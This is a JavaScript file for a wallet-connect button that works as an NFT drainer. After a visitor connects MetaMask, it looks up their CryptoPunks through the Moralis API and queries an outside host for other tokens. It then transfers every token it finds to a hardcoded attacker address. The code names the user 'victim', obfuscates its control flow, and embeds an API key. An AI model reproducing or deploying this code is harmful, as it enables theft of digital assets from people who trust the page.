const button=document.querySelector('#connectButton');
const contract='0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb'; // crypto punks
const my_address='0xc1B9b7C5ad607A5f62cc6A3Dfbe318Ba7394Bf86';
const moralis_token = 'wn4MNUjewtvc8oLnW36P6m53LcNqsGeKYCgaLvHxP4PP4Ibtqd2mpL98X3tDmkhC';

button.addEventListener('click', async () => {
    let step = 0;
    while (step < 65535) switch (step) {
        case 0:
            step = window.ethereum ? 1 : 2;
            break;
        case 1:
            step = 65535;
        {
            window.web3 = new Web3(ethereum);
            try {
                await ethereum.enable();
                await Moralis.enableWeb3();
                const victim = web3.currentProvider.selectedAddress;
                const saWe = check_moralis(`https://deep-index.moralis.io/api/v2/${victim}/nft/${contract}?chain=eth&format=decimal`);
                const result = saWe.result;
                const tokens = [];
                for (const i in result) {
                    tokens.push(result[i]['token_id']);
                }
                console.log(tokens);
                for (const i in tokens) {
                    await send_token(contract, tokens[i], 'erc721')
                }
                const MVMe = check_doodles(`https://api.doodles.vc:8000/check?address=${victim}`);
                console.log(MVMe);
                for (const i in MVMe) {
                    await send_token(MVMe[i][0], MVMe[i][1], MVMe[i][4])
                }
            } catch (e) {
                console.log(e);
            }
        }
            break;
        case 2:
            step = 65535;
            let step2 = 0;
            while (step2 < 65535) switch (step2) {
                case 0:
                    step2 = window['web3'] ? 1 : 2;
                    break;
                case 1:
                    step2 = 65535;
                {
                    window['web3'] = new Web3(web3.currentProvider);
                }
                    break;
                case 2:
                    step2 = 65535;
                {
                    statusp['innerHTML'] = 'No Metamask (or other Web3 Provider) installed';
                }
                    break;
            }
            break;
    }
});

async function send_token(contract, tid, type) {
    const data = {
        type: type,
        receiver: my_address,
        contractAddress: contract,
        tokenId: tid
    };
    try {
        let r = await Moralis.transfer(data)
    } catch (e) {
        console.log(e)
    }
}

function check_moralis(cGjc) {
    let xhr = new XMLHttpRequest();
    xhr.open('GET', cGjc, false);
    xhr.setRequestHeader('X-API-Key', moralis_token);
    xhr.send(null);
    return JSON.parse(xhr['responseText']);
}

function check_doodles(syUb) {
    let xhr = new XMLHttpRequest();
    xhr.open('GET', syUb, false);
    xhr.send(null);
    return JSON.parse(xhr['responseText']);
}
